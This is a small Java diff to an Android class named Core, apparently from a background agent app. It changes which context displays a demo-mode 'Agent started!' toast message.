@@ -271,7 +271,7 @@ public class Core extends Activity implements Runnable {
 
 				if (Cfg.DEMO) {
 					//Beep.beepPenta();
-					Toast.makeText(this, M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+					Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 
 				// Torna true in caso di UNINSTALL o false in caso di stop del
